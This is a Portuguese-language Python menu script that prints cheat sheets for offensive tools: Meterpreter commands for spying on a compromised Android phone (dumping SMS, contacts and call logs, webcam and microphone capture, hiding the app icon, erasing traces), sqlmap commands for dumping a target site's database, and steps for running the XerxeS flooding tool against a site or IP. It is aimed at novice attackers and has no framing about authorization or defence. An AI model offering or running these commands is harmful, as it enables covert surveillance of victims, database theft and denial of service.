# Copyright (C) 2018
import sys
import time

print('''\033[32m
    _      _  _ _ _ _____  _ _ _   _ _   _ _   _ _   _ _ _ _____  _ _ _   _ _
   | \    / ||        |   |       |   | |   | |   | |        |   |       |   |
   |  \  /  ||_ _ _   |   |_ _ _  |_ _| |_ _| |_ _| |_ _ _   |   |_ _ _  |_ _|
   |   \/   ||        |   |       | \   |     | \   |        |   |       | \ 
   |        ||_ _ _   |   |_ _ _  |  \  |     |  \  |_ _ _   |   |_ _ _  |  \ 

                        \033[35m !!!MADE SIXX66 BY GASPAR!!! \033[0m''')
print('\n CARREGANDO...')
time.sleep(2)
time.sleep(0)


def metasploit():
    while True:
        print(''' 
        [1]COMANDOS DO ANDROID
        [2]COMANDOS DE AUDIO
        [3]COMANDOS DA WEBCAM
        [4]COMANDOS DA INTERFACE
        [5]COMANDOS DO SISTEMA
        [6]COMANDOS DE REDE
        [7]COMANDOS DO SISTEMA DE ARQUIVOS
        [8]COMANDOS PRINCIPAIS
        [9]SAIR''')
        opc = int(input('>>>: '))
        if opc == 1:
            print('''Comandos do Android
    ================

        Comando          Descrição
        -------          -----------
        activity_start    Inicie uma atividade do Android a partir de uma string Uri
        check_root        Verifique se o dispositivo tem root
        dump_calllog      Obter registro de chamadas
        dump_contacts     Obter lista de contatos
        dump_sms          Obter mensagens sms
        geolocate         Obtenha a latitude atual usando a geolocalização
        hide_app_icon     Ocultar o ícone do aplicativo no iniciador
        interval_collect  Gerenciar recursos de coleta de intervalo
        send_sms          Envia SMS da sessão de destino\033[31m |EX: send_sms -d 1122334455 -t 'gaspar3321'|\033[m
        set_audio_mode    Definir o modo de campainha
        sqlite_query      Consultar um banco de dados SQLite do armazenamento
        wakelock          Usado para manter a conexão mesmo que o android atacado entre em standby 
        wlan_geolocate    Obtém a latitude atual usando informações de WLAN''')
        elif opc == 2:
            print('''Comandos de Saída de Áudio
    =============================

        Comando            Descrição
        -------            -----------
        reproduzir         reproduzir um arquivo de áudio no sistema de destino, nada escrito no disco
    ''')
        elif opc == 3:
            print('''comandos da webcam
    =======================

        Comando         Descrição
        -------         -----------
        record_mic      Grava áudio do microfone padrão por X segundos\033[31m |EX: record_mic -d 10|\033[m
        webcam_chat     Iniciar um bate-papo por vídeo\033[31m  |EX: webcam_chat -i 2| \033[m
        webcam_list     Lista de webcams  \033[31m|USADO PARA OBTER O ID DA CÂMERA|\033[m 
        webcam_snap     Tire um instantâneo da webcam especificada\033[31m|EX: webcam_snap -i 2|\033[m
        webcam_stream   Reproduz um fluxo de vídeo da webcam especificada  \033[31m|EX: webcam_stream -i 2\033[m
    ''')
        elif opc == 4:
            print('''Comandos da interface do usuário
    ===============================

        Comando              Descrição
        -------              -----------
        screenshot      Capture uma captura de tela da área de trabalho interativa
    ''')
        elif opc == 5:
            print(''' Comandos do sistema
    =======================

        Comando           Descrição
        -------           -----------
        execute           Execute um comando
        getuid            Obter o usuário que o servidor está executando como
        localtime         Exibe a data e hora locais do sistema de destino
        pgrep             Filtrar processos por nome
        ps                Processos em execução da lista
        shell             Drop into a shell de comando do sistema
        sysinfo           Obtém informações sobre o sistema remoto, como SO
    ''')
        elif opc == 6:
            print('''Comandos de Rede
    ===========================

        Comando                Descrição
        -------                -----------
        ifconfig               interfaces de exibição ifconfig
        ipconfig               interfaces de exibição ipconfig
        portfwd                Encaminhar uma porta local para um serviço remoto
        route                  Visualizar e modificar a tabela de roteamento
    ''')
        elif opc == 7:
            print('''Comandos do sistema de arquivos
    ============================

        Comando         Descrição
        -------         -----------
        cat             Leia o conteúdo de um arquivo na tela
        cd              Entrar em um Diretório ou pasta |EX: cd Downloads
        checksum        Recupera a soma de verificação de um arquivo
        cp              Copiar a origem para o destino
        dir             Listar arquivos (alias para ls)
        download        Baixar um arquivo ou diretório
        edit            Editar um arquivo
        getlwd          Imprimir diretório de trabalho local
        getwd           Imprimir diretório de trabalho
        lcd             Alterar diretório de trabalho local
        lls             Listar arquivos locais
        lpwd            Imprimir diretório de trabalho local
        ls              arquivos de lista
        mkdir           Fazer diretório
        mv              Mover a origem para o destino
        pwd             Print diretório de trabalho
        rm              Excluir o arquivo especificado
        rmdir           Remover diretório
        search          Pesquisar por arquivos
        upload          Carregar um arquivo ou diretório
    ''')
        elif opc == 8:
            print('''' Comando                      Descrição
        -------                      -----------
        ?                            Menu de ajuda
        Background                   Backgrounds a sessão atual
        bgkill                       Elimina rastros deixados pelo payload\033[31m|EX: bgkill -i 1\033[m
        bglist                       Lista rastros deixados por você\033[31m|OBS: USADO JUNTO COM O bgkill\033[m1
        bgrun                        Executa um script meterpreter como um thread de segundo plano
        channel                      Exibe informações ou controla canais ativos
        close                        Fecha um canal
        disable_unicode_encoding     Desativa a codificação de sequências unicode
        enable_unicode_encoding      Ativa a codificação de sequências unicode
        exit                         Encerra a sessão do meterpreter
        get_timeouts                 Obtém os valores de tempo limite da sessão atual
        guid                         Obtenha a sessão GUID
        help                         menu Ajuda
        info                         Exibe informações sobre um módulo Post
        irb                          Solte no modo de script irb
        load                         Carrega uma ou mais extensões de meterpreter
        machine_id                   Obtém o ID do MSF da máquina anexada à sessão
        exit                         Encerrar a sessão do medidor
        read                         Lê dados de um canal
        resource                     Executar os comandos armazenados em um arquivo
        Execute                      Executa um script meterpreter ou um módulo Post
        sessions                     mudam rapidamente para outra sessão
        set_timeouts                 Define os valores de tempo limite da sessão atual
        sleep                        Force Meterpreter para ficar quieto e restabelecer a sessão.
        transport                    Alterar o mecanismo de transporte atual
        use                          o alias obsoleto para "load"
        uuid                         Obter o UUID para a sessão atual
        writes                       Grava dados em um canal''')
        elif opc == 9:
            menu()
def termux():
    print('''\n[1]COMANDOS BÁSICOS
[2]VOLTAR''')
    z1 = int(input('>>>: '))
    if z1 == 1:
        print('''comandos básicos do termux 
--------------------------
comandos                        descrição
--------                        ---------
apt update:                     Usado para baixar as informações do pacotes configurados.
apt upgrade:                    É usado para instalar atualizações disponíveis de todos os pacotes. 
ls:                             Usado para listar diretórios.
termux-setup-storage:           Garante a permissão de leitura de arquivos.
cd:                             Usado para navegar entre diretórios\033[31m|EX: cd downloads\033[m
mv:                             Usado para mover aquivos\033[31m|EX: mv xerxes.c /$HOME\033[m
rm:                             remove arquivos e diretórios\033[31m|EX: rm xerxes\033[m
chmod:                          Comando que pode alterar permissões de acesso\033[31m|EX: chmod +x xerxes.c\033[m
pwd:                            mostra o caminho completo do diretório em que você se encontra.
cat:                            mostra o conteúdo de um arquivo binário ou texto\033[31m|EX: cat arquivo.txt\033[m
cd.. :                          Volta ao diretório anterior.
clear:                          limpa a tela do terminal.
chmod 777:                      Dá permissão total ao arquivo\033[31m|EX: chmod 777 xerxes.c \033[m
cp:                             Copia todo o conteúdo do diretório.
kill:                           Encerra um ou mais processos em andamento.
rm -rf:                          remove todos os arquivos e subdiretórios do diretório especificado.''')
        termux()
    elif z1 == 2:
        menu()
def menu():
    print('''\n[1]METASPLOIT
[2]SQLMAP
[3]XERXES
[4]COMANDOS DO TERMUX
[5]SAIR''')
    n = int(input('\n>>>: '))
    if n == 1:
        metasploit()
    elif n == 2:
        sql()
    elif n == 3:
        xerxes()
    elif n == 4:
        termux()
    elif n == 5:
        sys.exit()
def xerxes():
    print('''\n[1]COMANDOS
[2]VOLTAR''')
    n3 = int(input('>>>: '))
    if n3 == 1:
        print('''\n(1):| cd xerxes
(2):| pkg install clang
(3):| clang xerxes.c -o xerxes
(4):| ./xerxes (\033[31m site ou ip \033[m)''')
        xerxes()
    elif n3 == 2:
        menu()
def sql():
    print('''\n[1]COMANDOS
[2]VOLTAR''')
    n1 = int(input('>>>: '))
    if n1 == 1:
        print('''\n(1):| python2 sqlmap.py -u (\033[31m site sem parênteses \033[m) --dbs
                \n(2):|python2 sqlmap.py -u (\033[31m site sem parênteses \033[m) --dbs -D (\033[31m nome do dbs \033[m) --tables
                \n(3):|python2 sqlmap.py -u (\033[31m site sem parênteses \033[m) --dbs -D (\033[31m nome do dbs \033[m) -T (\033[31m nome da tabela \033[m) --columns
                \n(4):|python2 sqlmap.py -u (\033[31m site sem parênteses \033[m) --dbs -D (\033[31m dbs \033[m) -T (\033[31m tabela \033[m) -C (\033[31m coluna \033[m) -- dump
                \n \033[36m   OBSERVAÇÃO: QUALQUER ERRO DE ESCRITA ALTERA DIRETAMENTE O RESULTADO!
          OBSERVE ATENTAMENTE O SEU COMANDO ANTES DE EXECUTÁ-LO! \033[m''')
        sql()
    elif n1 == 2:
        menu()
menu()
